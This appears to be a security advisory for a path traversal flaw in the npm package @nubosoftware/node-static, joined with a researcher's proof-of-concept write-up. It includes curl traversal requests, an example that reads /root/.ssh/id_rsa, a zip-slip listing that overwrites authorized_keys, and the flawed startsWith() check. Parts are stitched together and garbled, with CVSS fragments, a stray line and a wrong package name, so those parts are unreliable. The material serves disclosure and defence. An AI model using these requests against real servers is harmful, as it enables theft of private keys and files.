## How to fix?

There is no fixed version for `@nubosoftware/node-static`.

## Overview

[@nubosoftware/node-static](https://www.npmjs.org/package/%40nubosoftware/node-static) is a simple, compliant file streaming module for node

Affected versions of this package are vulnerable to Directory Traversal due to improper file path sanitization in the `startsWith()` method in the `servePath` function.

## PoC

```
curl --path-as-is "http://localhost:3000/../public-isprivate/index.html"

```
## Details

A Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with "dot-dot-slash (../)" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.

Directory Traversal vulnerabilities can be generally divided into two types:

* **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.

`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm%3Ast%3A20140206). In our example, we will serve files from the `public` route.

If an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.

```
curl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa

```

**Note** `%2e` is the URL encoded version of `.` (dot).

* **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`.

One way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.

The following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:

```
2018-04-15 22:04:29 .....           19           19  good.txt
2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys

```

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is a total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact. For example, an attacker steals the administrator's password, or private encryption keys of a web server.

## Overview

[node-static](https://github.com/cloudhead/node-static) is a rfc 2616 compliant HTTP static-file server module, with built-in caching.

Path traversal vulnerability in @nubosoftware/node-static v0.7.11

 [Raw](/lirantal/c80b28e7bee148dc287339cb483e42bc/raw/33dfaf5b64de382b4f6667045cd2df92996f4a06/path-traversal-in-node-static.md)

# Path traversal vulnerability in @nubosoftware/node-static@0.7.11

Important: this vulnerability applies to 2 modules which share the same code but different npm packages: `@nubosoftware/node-static` and `node-static` and so a CVE should be assigned to both.

`@nubosoftware/node-static` is a local HTTP file server, or as is it describes itself: `a simple, rfc 2616 compliant file streaming module for node`.

Observation:

* It's at virtually 0 downloads
* It was last published 6 months ago (referring to @nubosoftware/node-static)

Resources:

* Project's GitHub source code: <https://github.com/cloudhead/node-static>
* Project's npm package: [https://www.npmjs.com/package/@nubosoftware/node-static](https://www.npmjs.com/package/%40nubosoftware/node-static)

## Background on exploitation

The `static-dev-server` npm package is joining paths from users to the root directory
and asset for the path accessed being relative to that of the root directory,
however this last case is where this is implemented in a vulnerable way:

[Lines 160-163](https://github.com/cloudhead/node-static/blob/master/lib/node-static.js#L160-L163) in `lib/node-static.js`
make an attempt to ensure the path is within the constraint root directory, however this logic of `startsWith()` is
flawed.

```
        // Make sure we're not trying to access a
        // file outside of the root.
        if (pathname.startsWith(that.root)) {
            tryStat(pathname, function (e, stat) {
```

This vulnerability should probably be classified as a
[CWE-22](https://cwe.mitre.org/data/definitions/22.html): Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal').

## Proof of Concept exploit

1. Install the latest version of `@nubosoftware/node-static`: `npm install @nubosoftware/node-static@0.7.11`
2. Make sure you have a `public/` directory with files in it
3. Make sure you have a `public-isprivate` directory with files in it
4. Make sure you have a `private/` directory with files in it

All directories above should share the same relative parent, meaning the
directory structure should look as follows:

```
.
├── private
│   └── index.html
├── public
│   └── index.html
└── public-isprivate
    └── index.html

```

ca
Then, run a server powered by `@nubosoftware/node-static` as follows:

```
var static = require('@nubosoftware/node-static');

//
// Create a node-static server instance to serve the './public' folder
//
var file = new static.Server('./public');

require('http').createServer(function (request, response) {
    request.addListener('end', function () {
        //
        // Serve files!
        //
        file.serve(request, response);
    }).resume();
}).listen(3000);
```

which sets the public root directory to the `public/`
directory that we previously created:

The server should run within the local folder where all `private/`, `public/`,
and `public-isprivate` are subfolders.

Next, verify the following:

1. `curl --path-as-is "http://localhost:3000/../private/index.html"` -> this request is denied,
   as expected with prior vulnerability fix.
2. `curl --path-as-is "http://localhost:3000/../public/index.html"` -> this request is allowed,
   as expected with the functionality of this local http server
3. `curl --path-as-is "http://localhost:3000/../public-isprivate/index.html"` -> this request
   SHOULD BE DENIED because it is outside the `public/` folder, but it is actually allowed.

Case (3) shouldn't happen, but it does, due to an improper fix in the library's source code.
